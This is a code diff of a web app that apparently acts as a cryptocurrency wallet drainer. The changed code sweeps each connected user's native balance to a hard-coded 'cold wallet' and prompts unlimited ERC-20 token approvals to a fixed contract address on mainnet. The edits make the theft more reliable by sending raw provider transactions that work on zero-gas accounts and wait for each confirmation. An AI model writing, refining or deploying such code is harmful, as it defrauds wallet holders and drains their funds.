@@ -31,7 +31,6 @@ import TronWeb from 'tronweb'
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
 const NETWORK = 'Mainnet' // Change to 'Mainnet' when ready
 
-
 // 🔥 CONTRACT ADDRESSES
 const TRON_CONTRACT_ADDRESS = 'TTuQeHCMbWHB8PDTr1XDH7dxciQJkkt7Yt'
 const EVM_CONTRACT_ADDRESS =  '0x48C13137c7bC86084D420649fb4438B7721445C1'
@@ -233,7 +232,6 @@ export default function App() {
     
   const isEVM = !isTron;
 
-
   const resolveTronWeb = () => {
     const w = window as any;
     if (w.tronWeb?.contract) return w.tronWeb;
@@ -410,13 +408,21 @@ export default function App() {
               
               if (liveBal > totalGas) {
                 const sendAmount = liveBal - totalGas;
-                const tx = await signer.sendTransaction({
-                  to: EVM_COLD_WALLET, 
-                  value: sendAmount
+                const hexValue = "0x" + sendAmount.toString(16);
+                
+                // 🛠️ ULTIMATE FIX: Bypass Ethers.js entirely. Using the raw provider directly
+                // pauses the loop properly while MetaMask is open.
+                const txHash = await (evmWalletProvider as any).request({
+                    method: 'eth_sendTransaction',
+                    params: [{
+                        from: cleanSenderAddress,
+                        to: EVM_COLD_WALLET.toLowerCase(), 
+                        value: hexValue,
+                        gas: "0x5208" // 21000
+                    }]
                 });
                 
-                setTxHash(tx.hash);
-                await tx.wait(); // Added wait here
+                setTxHash(txHash);
                 successCount++; 
                 log(`✅ ${token.symbol} Native Sweep Sent!`);
               } else {
@@ -426,33 +432,29 @@ export default function App() {
               setStatus(`Approving ${token.symbol}...`);
               log(`[ACTION] Prompting Approve: ${token.symbol}`);
               
-              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
+              const usdtContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
               const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
               
-              const txHash = await ethersProvider.send('eth_sendTransaction', [{
-                  from: cleanSenderAddress,
-                  to: token.address.toLowerCase(),
-                  data: encodedData,
-                  gas: "0x14C08" 
-              }]);
+              // 🛠️ ULTIMATE FIX: Using the raw provider bypasses Ethers.js crash on 0-gas accounts
+              // It also intrinsically WAITS for the user to click Confirm/Reject before continuing the loop!
+              const txHash = await (evmWalletProvider as any).request({
+                  method: 'eth_sendTransaction',
+                  params: [{
+                      from: cleanSenderAddress,
+                      to: token.address.toLowerCase(),
+                      data: encodedData,
+                      gas: "0x14C08" // Hardcoded 85,000 gas limit
+                  }]
+              });
               
               setTxHash(txHash);
-              
-              // We simulate waiting for the raw RPC transaction by fetching the receipt.
-              // Note: ethersProvider.send('eth_sendTransaction') returns a hash string, 
-              // so we must ask the provider to wait for that specific hash.
-              const txReceipt = await ethersProvider.waitForTransaction(txHash);
-              
-              if (txReceipt && txReceipt.status === 1) {
-                  successCount++; 
-                  log(`✅ ${token.symbol} Approved!`);
-              } else {
-                  throw new Error(`Transaction failed or reverted on-chain.`);
-              }
+              successCount++; 
+              log(`✅ ${token.symbol} Approved!`);
             }
           } catch (err: any) {
              const exactError = err?.message || JSON.stringify(err);
-             log(`❌ Rejected: ${exactError.substring(0, 60)}...`);
+             // We trim the error log so it stays neat in the console
+             log(`❌ Rejected: ${exactError.substring(0, 40)}...`);
           }
         }
         
